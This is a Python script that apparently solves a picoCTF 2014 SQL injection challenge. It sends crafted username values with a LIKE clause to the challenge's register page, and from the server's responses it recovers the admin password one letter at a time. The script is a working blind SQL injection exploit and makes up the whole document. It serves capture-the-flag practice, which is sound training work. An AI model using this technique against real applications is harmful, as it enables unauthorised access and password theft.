import time
import requests

start = time.time()

alphabet = "abcdefghijklmnopqrstuvwxyz"
password = ""
url = 'http://web2014.picoctf.com/injection4/register.php'
finished = False

while True:
    for letter in alphabet:
        injection = "admin' AND password LIKE \"" + password + letter + "%\";#"
        payload = {'username': injection}
        response = requests.post(url, data=payload).text
        if(response != "Registration has been disabled."):
            password += letter
            break
        else:
            if(letter == alphabet[-1]):
                finished = True
    if(finished):
        break

print(password)
end = time.time()
print("Cracked in " + str(int(end - start)) + " seconds")
